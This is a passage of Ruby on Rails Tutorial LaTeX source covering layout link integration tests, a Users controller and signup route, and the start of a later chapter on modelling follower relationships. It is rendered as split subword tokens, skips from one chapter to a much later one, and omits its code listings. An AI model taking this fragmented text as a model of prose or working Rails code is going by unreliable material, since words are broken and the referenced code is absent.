▁Whi le ▁we ' re ▁at ▁it , ▁we ' ll ▁follow ▁a ▁common ▁web ▁convention ▁and ▁link ▁the ▁ logo ▁to ▁the ▁Home ▁page ▁as ▁well .
▁Header ▁partial ▁with ▁links .
▁ Foo ter ▁partial ▁with ▁links .
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http :// localhost :3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( F igure ~\ ref { fig : about _ page }).
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about }.
▁Now ▁that ▁we ' ve ▁ filled ▁in ▁sever al ▁of ▁the ▁layout ▁links , ▁it ' s ▁a ▁good ▁idea ▁to ▁test ▁them ▁to ▁make ▁sure ▁they ' re ▁working ▁correctly .
▁We ▁could ▁do ▁this ▁by ▁hand ▁with ▁a ▁browser , ▁first ▁visit ing ▁the ▁root ▁path ▁and ▁the n ▁check ing ▁the ▁links ▁by ▁hand , ▁but ▁this ▁quickly ▁becomes ▁cumbersome .
▁Instead , ▁we ' ll ▁simul ate ▁the ▁same ▁series ▁of ▁steps ▁using ▁an ▁\ emph { integration ▁test }, ▁which ▁allows ▁us ▁to ▁write ▁an ▁end - to - end ▁test ▁of ▁our ▁application ' s ▁behavior .
▁We ▁can ▁get ▁started ▁by ▁ generating ▁a ▁template ▁test , ▁which ▁we ' ll ▁call ▁\ k ode { site \_ layout } :
▁Note ▁that ▁the ▁Rails ▁generator ▁automatically ▁app end s ▁\ k ode { \_ test } ▁to ▁the ▁name ▁of ▁the ▁test ▁file .
▁Ou r ▁plan ▁for ▁testing ▁the ▁layout ▁links ▁involve s ▁check ing ▁the ▁HTML ▁structure ▁of ▁our ▁site :
▁G et ▁the ▁root ▁path ▁( Home ▁page )
▁Verify ▁that ▁the ▁right ▁page ▁template ▁is ▁rendered
▁Check ▁for ▁the ▁correct ▁links ▁to ▁the ▁Home , ▁Help , ▁About , ▁and ▁Contact ▁pages
▁Listing ~\ ref { code : layout _ links _ test } ▁shows ▁how ▁we ▁can ▁use ▁Rails ▁integration ▁tests ▁to ▁tr an s l ate ▁these ▁steps ▁into ▁code , ▁beginning ▁with ▁the ▁\ k ode { assert \_ template } ▁method ▁to ▁verify ▁that ▁the ▁Home ▁page ▁is ▁rendered ▁using ▁the ▁correct ▁view
▁Some ▁developers ▁in s ist ▁that ▁a ▁single ▁test ▁should n ' t ▁contain ▁multiple ▁assertion s .
▁I ▁find ▁this ▁practice ▁to ▁be ▁un n ec es s ar ily ▁complicated , ▁while ▁also ▁in c ur r ing ▁an ▁extra ▁overhead ▁if ▁there ▁are ▁common ▁setup ▁task s ▁needed ▁before ▁each ▁test .
▁In ▁addition , ▁a ▁well - written ▁test ▁tell s ▁a ▁co h er ent ▁ s tory , ▁and ▁break ing ▁it ▁up ▁into ▁individual ▁pieces ▁d is r up t s ▁the ▁ n ar ra tive .
▁A ▁test ▁for ▁the ▁links ▁on ▁the ▁layout .
▁Listing ~\ ref { code : layout _ links _ test } ▁uses ▁some ▁of ▁the ▁more ▁advanced ▁options ▁of ▁the ▁\ k ode { assert \_ select } ▁method , ▁seen ▁before ▁in ▁Listing ~\ ref { code : title _ tests } ▁and ▁Listing ~\ ref { code : contact _ page _ test }.
▁In ▁this ▁case , ▁we ▁use ▁a ▁syntax ▁that ▁allows ▁us ▁to ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁link - - URL ▁combination ▁by ▁specify ing ▁the ▁tag ▁name ~\ k ode { a } ▁and ▁attribute ~\ k ode { href }, ▁as ▁in
▁Here ▁Rails ▁automatically ▁insert s ▁the ▁value ▁of ▁\ k ode { about \_ path } ▁in ▁place ▁of ▁the ▁question ▁mark ▁( es ca p ing ▁any ▁special ▁characters ▁if ▁necessary ), ▁there by ▁check ing ▁for ▁an ▁HTML ▁tag ▁of ▁the ▁form
▁Note ▁that ▁the ▁assertion ▁for ▁the ▁root ▁path ▁verifie s ▁that ▁there ▁are ▁\ emph { two } ▁such ▁links ▁( one ▁each ▁for ▁the ▁ logo ▁and ▁navigation ▁menu ▁element ) :
▁This ▁ensure s ▁that ▁both ▁links ▁to ▁the ▁Home ▁page ▁defined ▁in ▁Listing ~\ ref { code : header _ partial _ links } ▁are ▁present .
▁Some ▁more ▁uses ▁of ▁\ k ode { assert \_ select } ▁appear ▁in ▁Table ~\ ref { table : assert _ select }.
▁M at ch ing ▁HTML
▁Some ▁uses ▁of ▁\ k ode { assert \_ select }.
▁To ▁check ▁that ▁the ▁new ▁test ▁in ▁Listing ~\ ref { code : layout _ links _ test } ▁passes , ▁we ▁can ▁run ▁just ▁the ▁integration ▁tests ▁using ▁the ▁following ▁Rake ▁task :
▁If ▁all ▁we n t ▁well , ▁you ▁should ▁run ▁the ▁full ▁test ▁suite ▁to ▁verify ▁that ▁all ▁the ▁tests ▁are ▁\ passing :
▁With ▁the ▁added ▁integration ▁test ▁for ▁layout ▁links , ▁we ▁are ▁now ▁in ▁a ▁good ▁position ▁to ▁catch ▁re gr es s ion s ▁quickly ▁using ▁our ▁test ▁suite .
▁As ▁a ▁c ap st one ▁to ▁our ▁work ▁on ▁the ▁layout ▁and ▁routing , ▁in ▁this ▁section ▁we ' ll ▁make ▁a ▁route ▁for ▁the ▁signup ▁page , ▁which ▁will ▁mean ▁creating ▁a ▁second ▁controller ▁along ▁the ▁way .
▁This ▁is ▁a ▁first ▁important ▁step ▁toward ▁allow ing ▁users ▁to ▁ register ▁for ▁our ▁site ; ▁we ' ll ▁take ▁the ▁next ▁step , ▁model ing ▁users , ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁and ▁we ' ll ▁finish ▁the ▁job ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁< n >< n > ▁\ subsection { Users ▁controller } ▁% ▁( fold )< n > ▁\ label { sec : users _ controller }< n >< n >
▁We ▁created ▁our ▁first ▁controller , ▁the ▁Static ▁Pages ▁controller , ▁in ▁Section ~\ ref { sec : static _ pages }.
▁It ' s ▁time ▁to ▁create ▁a ▁second ▁one , ▁the ▁Users ▁controller .
▁Follow ing ▁the ▁conventional ▁\ href { http :// en . wiki p edia . org / wiki / Re present ation al _ State _ Transfer }{ REST ▁architecture } ▁favor ed ▁by ▁Rails , ▁we ' ll ▁call ▁the ▁action ▁for ▁new ▁users ▁\ k ode { new }, ▁which ▁we ▁can ▁arrange ▁to ▁create ▁automatically ▁by ▁passing ▁\ k ode { new } ▁as ▁an ▁argument ▁to ▁\ k ode { generate }.
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : generate _ users _ controller }.
▁Generat ing ▁a ▁Users ▁controller ▁( with ▁a ▁\ k ode { new } ▁action ).
▁create ▁app / controllers / users _ controller . rb
▁invoke ▁ erb
▁create ▁app / views / users
▁create ▁app / views / users / new . html . erb
▁invoke ▁helper
▁create ▁app / helpers / users _ helper . rb
▁invoke ▁test _ unit
▁invoke ▁assets
▁invoke ▁ coffee
▁create ▁app / assets / javascripts / users . js . coffee
▁invoke ▁ scss
▁create ▁app / assets / stylesheets / users . css . scss
▁As ▁required , ▁Listing ~\ ref { code : generate _ users _ controller } ▁creates ▁a ▁Users ▁controller ▁with ▁a ▁\ k ode { new } ▁action ▁( Listing ~\ ref { code : initial _ users _ controller }) ▁and ▁a ▁ stub ▁user ▁view ▁( Listing ~\ ref { code : initial _ new _ action }).
▁It ▁also ▁creates ▁a ▁minimal ▁test ▁for ▁the ▁new ▁user ▁page ▁( Listing ~\ ref { code : user _ new _ test }), ▁which ▁should ▁current ly ▁pass :
▁The ▁initial ▁Users ▁controller , ▁with ▁a ▁\ k ode { new } ▁action .
▁The ▁initial ▁\ k ode { new } ▁view ▁for ▁Users .
▁A ▁test ▁for ▁the ▁new ▁user ▁page .
▁With ▁the ▁code ▁from ▁Section ~\ ref { sec : users _ controller }, ▁we ▁already ▁have ▁a ▁working ▁page ▁for ▁new ▁users ▁at ▁/ users / new , ▁but ▁recall ▁from ▁Table ~\ ref { table : url _ m app ing } ▁that ▁we ▁want ▁the ▁URL ▁to ▁be ▁/ signup ▁instead .
▁We ' ll ▁follow ▁the ▁examples ▁from ▁Listing ~\ ref { code : static _ page _ routes } ▁and ▁add ▁a ▁\ k ode { get ▁' / signup ' } ▁rule ▁for ▁the ▁signup ▁URL , ▁as ▁show n ▁in ▁Listing ~\ ref { code : signup _ route }.
▁A ▁route ▁for ▁the ▁signup ▁page .
▁Next , ▁we ' ll ▁use ▁the ▁new ly ▁defined ▁named ▁route ▁to ▁add ▁the ▁proper ▁link ▁to ▁the ▁button ▁on ▁the ▁Home ▁page .
▁As ▁with ▁the ▁other ▁routes , ▁\ k ode { get ▁' signup ' } ▁automatically ▁gives ▁us ▁the ▁named ▁route ▁\ k ode { signup \_ path }, ▁which ▁we ▁put ▁to ▁use ▁in ▁Listing ~\ ref { code : home _ page _ signup _ link }.
▁ Adding ▁a ▁test ▁for ▁the ▁signup ▁page ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : layout _ exercises }. )
▁Link ing ▁the ▁button ▁to ▁the ▁signup ▁page .
▁F inally , ▁we ' ll ▁add ▁a ▁custom ▁ stub ▁view ▁for ▁the ▁signup ▁page ▁( Listing ~\ ref { code : initial _ signup _ page }).
▁The ▁initial ▁( stub ) ▁signup ▁page .
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : log _ in _ log _ out }).
▁The ▁result ing ▁new ▁user ▁page ▁( at ▁the ▁URL ▁/ signup ) ▁appears ▁in ▁F igure ~\ ref { fig : new _ signup _ page }.
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup }.
▁In ▁this ▁chapter , ▁we ' ve ▁ha m m er ed ▁our ▁application ▁layout ▁into ▁ s ha p e ▁and ▁polish ed ▁up ▁the ▁routes .
▁The ▁rest ▁of ▁the ▁book ▁is ▁d ed icated ▁to ▁f le s h ing ▁out ▁the ▁sample ▁application : ▁first , ▁by ▁adding ▁users ▁who ▁can ▁sign ▁up , ▁log ▁in , ▁and ▁log ▁out ; ▁next , ▁by ▁adding ▁user ▁microposts ; ▁and , ▁finally , ▁by ▁adding ▁the ▁ability ▁to ▁follow ▁other ▁users .
▁At ▁this ▁point , ▁if ▁you ▁are ▁using ▁Git , ▁you ▁should ▁merge ▁your ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁Then ▁push ▁up ▁to ▁Bitbucket :
▁F inally , ▁deploy ▁to ▁Heroku :
▁The ▁result ▁of ▁the ▁deployment ▁should ▁be ▁a ▁working ▁sample ▁application ▁on ▁the ▁production ▁server ▁( F igure ~\ ref { fig : layout _ production }).
▁The ▁sample ▁application ▁in ▁production .
▁If ▁you ▁run ▁into ▁trouble , ▁try ▁running
▁to ▁debug ▁the ▁error ▁using ▁the ▁Heroku ▁log file .
▁ )< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : filling _ in _ the _ layout _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Using ▁HTML 5 , ▁we ▁can ▁define ▁a ▁site ▁layout ▁with ▁ logo , ▁header , ▁ footer , ▁and ▁main ▁body ▁content .
▁Rails ▁partials ▁are ▁used ▁to ▁place ▁markup ▁in ▁a ▁separate ▁file ▁for ▁convenience .
▁CSS ▁allows ▁us ▁to ▁style ▁the ▁site ▁layout ▁base d ▁on ▁CSS ▁classes ▁and ▁id s .
▁The ▁Bootstrap ▁framework ▁make s ▁it ▁easy ▁to ▁make ▁a ▁nicely ▁design ed ▁site ▁quickly .
▁Sass ▁and ▁the ▁asset ▁pipeline ▁allow ▁us ▁to ▁eliminate ▁duplication ▁in ▁our ▁CSS ▁while ▁p ac k a g ing ▁up ▁the ▁results ▁ efficient ly ▁for ▁production .
▁Rails ▁allows ▁us ▁to ▁define ▁custom ▁routing ▁rules , ▁there by ▁providing ▁named ▁routes .
▁ Integration ▁tests ▁effective ly ▁simul ate ▁a ▁browser ▁click ing ▁from ▁page ▁to ▁page .
▁As ▁suggest ed ▁in ▁Section ~\ ref { sec : sass }, ▁go ▁through ▁the ▁steps ▁to ▁convert ▁the ▁ footer ▁CSS ▁from ▁Listing ~\ ref { code : footer _ css } ▁to ▁Listing ~\ ref { code : refactored _ scss } ▁to ▁SCSS ▁by ▁hand .
▁In ▁the ▁integration ▁test ▁from ▁Listing ~\ ref { code : layout _ links _ test }, ▁add ▁code ▁to ▁visit ▁the ▁signup ▁page ▁using ▁the ▁\ k ode { get } ▁method ▁and ▁verify ▁that ▁the ▁result ing ▁page ▁title ▁is ▁correct .
▁It ' s ▁convenient ▁to ▁use ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁the ▁tests ▁by ▁including ▁the ▁Application ▁helper ▁into ▁the ▁test ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ application _ helper }.
▁We ▁can ▁the n ▁test ▁for ▁the ▁right ▁title ▁using ▁code ▁like ▁Listing ~\ ref { code : layout _ links _ test _ signup _ full _ title _ helper } ▁( which ▁extend s ▁the ▁solution ▁from ▁the ▁previous ▁exercise ).
▁This ▁is ▁brittle , ▁though , ▁because ▁now ▁any ▁t y p o ▁in ▁the ▁base ▁title ▁( such ▁as ▁`` Ruby ▁on ▁Rails ▁T u to i al '') ▁won ' t ▁be ▁ ca ug h t ▁by ▁the ▁test ▁suite .
▁Fix ▁this ▁problem ▁by ▁writing ▁a ▁direct ▁test ▁of ▁the ▁\ k ode { full \_ title } ▁helper , ▁which ▁involve s ▁creating ▁a ▁file ▁to ▁test ▁the ▁application ▁helper ▁and ▁the n ▁ filling ▁in ▁the ▁code ▁indicate d ▁with ▁\ k ode { FILL \_ IN } ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests }.
▁( Listing ~\ ref { code : full _ title _ helper _ tests } ▁uses ▁\ k ode { assert \_ equal ▁< expected > , ▁< actual > }, ▁which ▁verifie s ▁that ▁the ▁expected ▁result ▁\ line break ▁matches ▁the ▁actual ▁value ▁when ▁compare d ▁with ▁the ▁\ k ode {==} ▁operator .)
▁ Includ ing ▁the ▁Application ▁helper ▁in ▁tests .
▁Using ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁a ▁test .
▁A ▁direct ▁test ▁the ▁\ k ode { full \_ title } ▁helper .
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁sample ▁application ▁by ▁adding ▁a ▁so cial ▁layer ▁that ▁allows ▁users ▁to ▁follow ▁( and ▁unfollow ) ▁other ▁users , ▁result ing ▁in ▁each ▁user ' s ▁Home ▁page ▁display ing ▁a ▁status ▁feed ▁of ▁the ▁followed ▁users ' ▁microposts .
▁We ' ll ▁start ▁by ▁learning ▁how ▁to ▁model ▁relationships ▁between ▁users ▁in ▁Section ~\ ref { sec : the _ relationship _ model }, ▁and ▁we ' ll ▁build ▁the ▁corresponding ▁web ▁interface ▁in ▁Section ~\ ref { sec : a _ web _ interface _ for _ following _ and _ followers } ▁( including ▁an ▁introduction ▁to ▁Ajax ).
▁We ' ll ▁end ▁by ▁developing ▁a ▁fully ▁functional ▁status ▁feed ▁in ▁Section ~\ ref { sec : the _ status _ feed }.
▁This ▁final ▁chapter ▁contains ▁some ▁of ▁the ▁most ▁challenging ▁material ▁in ▁the ▁tutorial , ▁including ▁some ▁Ruby / SQL ▁trick er y ▁to ▁make ▁the ▁status ▁feed .
▁Through ▁these ▁examples , ▁you ▁will ▁see ▁how ▁Rails ▁can ▁handle ▁even ▁rather ▁in tr ic ate ▁data ▁models , ▁which ▁should ▁serve ▁you ▁well ▁as ▁you ▁go ▁on ▁to ▁develop ▁your ▁own ▁applications ▁with ▁their ▁own ▁specific ▁requirements .
▁To ▁help ▁with ▁the ▁tr an s it ion ▁from ▁tutorial ▁to ▁in dependent ▁development , ▁Section ~\ ref { sec : following _ co nclusion } ▁offer s ▁some ▁point ers ▁to ▁more ▁advanced ▁resources .
▁Because ▁the ▁material ▁in ▁this ▁chapter ▁is ▁particular ly ▁challenging , ▁before ▁writing ▁any ▁code ▁we ' ll ▁p a use ▁for ▁a ▁moment ▁and ▁take ▁a ▁to ur ▁of ▁the ▁interface .
▁As ▁in ▁previous ▁chapter s , ▁at ▁this ▁ early ▁stage ▁we ' ll ▁represent ▁pages ▁using ▁mockup s
▁The ▁full ▁page ▁ flow ▁run s ▁as ▁follows : ▁a ▁user ▁( John ▁Calvin ) ▁start s ▁at ▁his ▁profile ▁page ▁( F igure ~\ ref { fig : page _ flow _ profile _ mockup }) ▁and ▁navigate s ▁to ▁the ▁Users ▁page ▁( F igure ~\ ref { fig : page _ flow _ user _ index _ mockup }) ▁to ▁select ▁a ▁user ▁to ▁follow .
▁Calvin ▁navigate s ▁to ▁the ▁profile ▁of ▁a ▁second ▁user , ▁Thomas ▁Hobbes ▁( F igure ~\ ref { fig : page _ flow _ other _ profile _ follow _ button }), ▁click ing ▁on ▁the ▁`` Follow '' ▁button ▁to ▁follow ▁that ▁user .
▁This ▁changes ▁the ▁`` Follow '' ▁button ▁to ▁`` U n follow '' ▁and ▁increment s ▁Hobbes ' s ▁`` followers '' ▁count ▁by ▁one ▁( F igure ~\ ref { fig : page _ flow _ other _ profile _ unfollow _ button _ mockup }).
▁N a v ig at ing ▁to ▁his ▁home ▁page , ▁Calvin ▁now ▁see s ▁an ▁increment ed ▁`` following '' ▁count ▁and ▁find s ▁Hobbes ' s ▁microposts ▁in ▁his ▁status ▁feed ▁( F igure ~\ ref { fig : page _ flow _ home _ page _ feed _ mockup }).
▁The ▁rest ▁of ▁this ▁chapter ▁is ▁d ed icated ▁to ▁making ▁this ▁page ▁ flow ▁actually ▁work .
▁A ▁current ▁user ' s ▁profile .
▁Find ing ▁a ▁user ▁to ▁follow .
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button .
▁A ▁profile ▁with ▁an ▁unfollow ▁button ▁and ▁increment ed ▁followers ▁count .
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁increment ed ▁following ▁count .
▁\ label { fig : page _ flow _ home _ page _ feed _ mockup } }< n >\ end { figure }< n >< n >< n > ▁\ section { The ▁Relationship ▁model } ▁% ▁( fold )< n > ▁\ label { sec : the _ relationship _ model }< n >< n >
▁Ou r ▁first ▁step ▁in ▁implement ing ▁following ▁users ▁is ▁to ▁construct ▁a ▁data ▁model , ▁which ▁is ▁not ▁as ▁straightforward ▁as ▁it ▁seem s .
▁As ▁we ▁will ▁see , ▁there ▁is ▁a ▁problem ▁with ▁this ▁approach , ▁and ▁we ' ll ▁learn ▁how ▁to ▁fix ▁it ▁using ▁\ k ode { has \_ many ▁: through }.
▁As ▁usual , ▁Git ▁users ▁should ▁create ▁a ▁new ▁topic ▁branch :
▁following - users
▁< n >\ end { code }< n >< n > ▁\ subsection { A ▁problem ▁with ▁the ▁data ▁model ▁( and ▁a ▁solution )} ▁% ▁( fold )< n > ▁\ label { sec : a _ problem _ with _ the _ data _ model }< n >< n >
▁As ▁a ▁first ▁step ▁toward ▁construct ing ▁a ▁data ▁model ▁for ▁following ▁users , ▁let ' s ▁examine ▁a ▁typical ▁case .
▁For ▁instance , ▁consider ▁a ▁user ▁who ▁follows ▁a ▁second ▁user : ▁we ▁could ▁say ▁that , ▁e . g . , ▁Calvin ▁is ▁following ▁Hobbes , ▁and ▁Hobbes ▁is ▁followed ▁by ▁Calvin , ▁so ▁that ▁Calvin ▁is ▁the ▁\ emph { follower } ▁and ▁Hobbes ▁is ▁\ emph { followed }.
▁Using ▁Rails ' ▁default ▁ pluralization ▁convention , ▁the ▁set ▁of ▁all ▁users ▁following ▁a ▁given ▁user ▁is ▁that ▁user ' s ▁\ emph { followers }, ▁and ▁\ k ode { h ob be s . followers } ▁is ▁an ▁array ▁of ▁those ▁users .
▁U nfortunately , ▁the ▁reverse ▁does n ' t ▁work : ▁by ▁default , ▁the ▁set ▁of ▁all ▁followed ▁users ▁would ▁be ▁called ▁the ▁\ emph { followed s }, ▁which ▁is ▁ungrammatical ▁and ▁cl um s y .
▁We ' ll ▁a do p t ▁Twitter ' s ▁convention ▁and ▁call ▁them ▁\ emph { following } ▁( as ▁in ▁`` 50 ▁following , ▁7 5 ▁followers '') , ▁with ▁a ▁corresponding ▁\ k ode { c al v in . following } ▁array .
▁This ▁discussion ▁suggest s ▁model ing ▁the ▁followed ▁users ▁as ▁in ▁F igure ~\ ref { fig : n a ive _ user _ has _ many _ following }, ▁with ▁a ▁\ k ode { following } ▁table ▁and ▁a ▁\ k ode { has \_ many } ▁association .
▁For ▁simplicity , ▁F igure ~\ ref { fig : n a ive _ user _ has _ many _ following } ▁omit s ▁the ▁\ k ode { following } ▁table ' s ~\ k ode { id } ▁column .
▁In ▁addition , ▁since ▁each ▁row ▁is ▁a ▁user , ▁we ▁would ▁need ▁to ▁include ▁the ▁user ' s ▁other ▁attributes , ▁including ▁the ▁name , ▁email , ▁password , ▁etc .
▁The ▁problem ▁with ▁the ▁data ▁model ▁in ▁F igure ~\ ref { fig : n a ive _ user _ has _ many _ following } ▁is ▁that ▁it ▁is ▁terribl y ▁re d un d ant : ▁each ▁row ▁contains ▁not ▁only ▁each ▁followed ▁user ' s ▁id , ▁but ▁all ▁their ▁other ▁information ▁as ▁well --- all ▁of ▁which ▁is ▁\ emph { already } ▁in ▁the ▁\ k ode { users } ▁table .
▁Even ▁ w or se , ▁to ▁model ▁user ▁\ emph { followers } ▁we ▁would ▁need ▁a ▁separate , ▁similar ly ▁re d un d ant ▁\ k ode { followers } ▁table .
▁F inally , ▁this ▁data ▁model ▁is ▁a ▁maintain ability ▁ n ight ma re : ▁each ▁time ▁a ▁user ▁changed ▁( s a y ) ▁their ▁name , ▁we ▁would ▁need ▁to ▁update ▁not ▁just ▁the ▁user ' s ▁record ▁in ▁the ▁\ k ode { users } ▁table ▁but ▁also ▁\ emph { ever y ▁row ▁containing ▁that ▁user }< n > in ▁both ▁the ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁table s .
▁The ▁problem ▁here ▁is ▁that ▁we ▁are ▁missing ▁an ▁under ly ing ▁abstract ion .
▁One ▁way ▁to ▁find ▁the ▁proper ▁model ▁is ▁to ▁consider ▁how ▁we ▁m ight ▁implement ▁the ▁act ▁of ▁\ emph { following } ▁in ▁a ▁web ▁application .
▁Recall ▁from ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁REST ▁architecture ▁involve s ▁\ emph { resources } ▁that ▁are ▁created ▁and ▁destroyed .
▁This ▁lead s ▁us ▁to ▁as k ▁two ▁question s : ▁When ▁a ▁user ▁follows ▁another ▁user , ▁what ▁is ▁being ▁created ?
▁When ▁a ▁user ▁\ emph { un } follow s ▁another ▁user , ▁what ▁is ▁being ▁destroyed ?
▁U p on ▁reflect ion , ▁we ▁see ▁that ▁in ▁these ▁cases ▁the ▁application ▁should ▁either ▁create ▁or ▁destroy ▁a ▁\ emph { relationship } ▁between ▁two ▁users .
▁A ▁user ▁the n ▁has ▁many ▁relationships , ▁and ▁has ▁many ▁\ k ode { following } ▁( or ▁\ k ode { followers }) ▁\ emph { through } ▁these ▁relationships .
▁There ' s ▁an ▁ additional ▁detail ▁we ▁need ▁to ▁address ▁re g ar d ing ▁our ▁application ' s ▁data ▁model : ▁unlike ▁ s y m me tr ic ▁F a ce book - style ▁friend s h ips , ▁which ▁are ▁always ▁re ci proc al ▁( at ▁least ▁at ▁the ▁data - model ▁level ), ▁Twitter - style ▁following ▁relationships ▁are ▁ potentially ▁\ emph { as y m me tr ic }--- C al v in ▁can ▁follow ▁Hobbes ▁without ▁Hobbes ▁following ▁Calvin .
▁To ▁distinguish ▁between ▁these ▁two ▁cases , ▁we ' ll ▁a do p t ▁the ▁terminology ▁of ▁\ emph { active } ▁and ▁\ emph { passive } ▁relationships : ▁if ▁Calvin ▁is ▁following ▁Hobbes ▁but ▁not ▁ v ic e ▁ v ers a , ▁Calvin ▁has ▁an ▁active ▁relationship ▁with ▁Hobbes ▁and ▁Hobbes ▁has ▁a ▁ passive ▁relationship ▁with ▁Calvin
▁T hanks ▁to ▁reader ▁P a ul ▁F io ra v ant i ▁for ▁suggest ing ▁this ▁terminology .
▁We ' ll ▁focus ▁now ▁on ▁using ▁active ▁relationships ▁to ▁generate ▁a ▁list ▁of ▁followed ▁users , ▁and ▁consider ▁the ▁ passive ▁case ▁in ▁Section ~\ ref { sec : followers }.
▁A ▁diagram ▁of ▁the ▁data ▁model ▁appears ▁in ▁F igure ~\ ref { fig : user _ has _ many _ following }.
▁A ▁model ▁of ▁followed ▁users ▁through ▁active ▁relationships .
▁Because ▁we ' ll ▁end ▁up ▁using ▁the ▁same ▁database ▁table ▁for ▁both ▁active ▁and ▁ passive ▁relationships , ▁we ' ll ▁use ▁the ▁generic ▁ ter m ▁\ emph { relationship } ▁for ▁the ▁table ▁name , ▁with ▁a ▁corresponding ▁Relationship ▁model .
▁The ▁result ▁is ▁the ▁Relationship ▁data ▁model ▁show n ▁in ▁F igure ~\ ref { fig : relationship _ model }.
▁We ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following } ▁how ▁to ▁use ▁the ▁Relationship ▁model ▁to ▁simul ate ▁both ▁Active ▁Relationship ▁and ▁Pass ive ▁Relationship ▁models .
▁The ▁Relationship ▁data ▁model .
▁To ▁get ▁started ▁with ▁the ▁implementation , ▁we ▁first ▁generate ▁a ▁migration ▁corresponding ▁to ▁F igure ~\ ref { fig : relationship _ model } :
▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ migration }.
▁ Adding ▁indices ▁for ▁the ▁\ k ode { relationships } ▁table .
▁( Compar e ▁to ▁the ▁email ▁uniqueness ▁index ▁from ▁Listing ~\ ref { code : email _ uniqueness _ index } ▁and ▁the ▁multiple - key ▁index ▁in ▁Listing ~\ ref { code : micropost _ migration }. )
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following }, ▁our ▁user ▁interface ▁won ' t ▁allow ▁this ▁to ▁happen , ▁but ▁adding ▁a ▁unique ▁index ▁arrange s ▁to ▁raise ▁an ▁error ▁if ▁a ▁user ▁ tries ▁to ▁create ▁duplicate ▁relationships ▁any way ▁( for ▁example , ▁by ▁using ▁a ▁command - line ▁tool ▁such ▁as ▁\ k ode { curl }).
▁To ▁create ▁the ▁\ k ode { relationships } ▁table , ▁we ▁ migrate ▁the ▁database ▁as ▁usual :
▁Before ▁implement ing ▁user ▁following ▁and ▁followers , ▁we ▁first ▁need ▁to ▁establish ▁the ▁association ▁between ▁users ▁and ▁relationships .
▁A ▁user ▁\ k ode { has \_ many } ▁relationships , ▁and --- since ▁relationships ▁involve ▁\ emph { two } ▁users --- a ▁relationship ▁\ k ode { belongs \_ to } ▁both ▁a ▁follower ▁and ▁a ▁followed ▁user .
▁As ▁with ▁microposts ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁we ▁will ▁create ▁new ▁relationships ▁using ▁the ▁user ▁association , ▁with ▁code ▁such ▁as
▁At ▁this ▁point , ▁you ▁m ight ▁expect ▁application ▁code ▁as ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁and ▁it ' s ▁similar , ▁but ▁there ▁are ▁two ▁key ▁difference s .
▁First , ▁in ▁the ▁case ▁of ▁the ▁user / micropost ▁association ▁we ▁could ▁write
▁ Technical ly , ▁Rails ▁convert s ▁the ▁argument ▁of ▁\ k ode { has \_ many } ▁to ▁a ▁class ▁name ▁using ▁the ▁\ k ode { class ify } ▁method , ▁which ▁convert s ▁\ k ode {" foo \_ bar s "} ▁to ▁\ k ode {" FooBar " }.
▁even ▁though ▁the ▁under ly ing ▁model ▁is ▁called ▁Relationship .
▁We ▁will ▁thus ▁have ▁to ▁tell ▁Rails ▁the ▁model ▁class ▁name ▁to ▁look ▁for .
▁S ec on d , ▁before ▁we ▁wrote
▁in ▁the ▁Micropost ▁model .
▁This ▁works ▁because ▁the ▁\ k ode { microposts } ▁table ▁has ▁a ▁\ k ode { user \_ id } ▁attribute ▁to ▁identify ▁the ▁user ▁( Section ~\ ref { sec : the _ basic _ model }).
▁An ▁id ▁used ▁in ▁this ▁m an n er ▁to ▁connect ▁two ▁database ▁table s ▁is ▁known ▁as ▁a ▁\ emph { foreign ▁key }, ▁and ▁when ▁the ▁foreign ▁key ▁for ▁a ▁User ▁model ▁object ▁is ▁\ k ode { user \_ id }, ▁Rails ▁infer s ▁the ▁association ▁automatically : ▁by ▁default , ▁Rails ▁expect s ▁a ▁foreign ▁key ▁of ▁the ▁form ▁\ k ode { < class > \_ id }, ▁where ▁\ k ode { < class > } ▁is ▁the ▁lower - case ▁version ▁of ▁the ▁class ▁name
▁ Technical ly , ▁Rails ▁uses ▁the ▁\ k ode { underscore } ▁method ▁to ▁convert ▁the ▁class ▁name ▁to ▁an ▁id .
▁For ▁example , ▁\ k ode {" FooBar ". underscore } ▁is ▁\ k ode {" foo \_ bar " }, ▁so ▁the ▁foreign ▁key ▁for ▁a ▁\ k ode { FooBar } ▁object ▁would ▁be ▁\ k ode { foo \_ bar \_ id }.
▁In ▁the ▁present ▁case , ▁although ▁we ▁are ▁ still ▁deal ing ▁with ▁users , ▁the ▁user ▁following ▁another ▁user ▁is ▁now ▁identifie d ▁with ▁the ▁foreign ▁key ▁\ k ode { follower \_ id }, ▁so ▁we ▁have ▁to ▁tell ▁that ▁to ▁Rails .
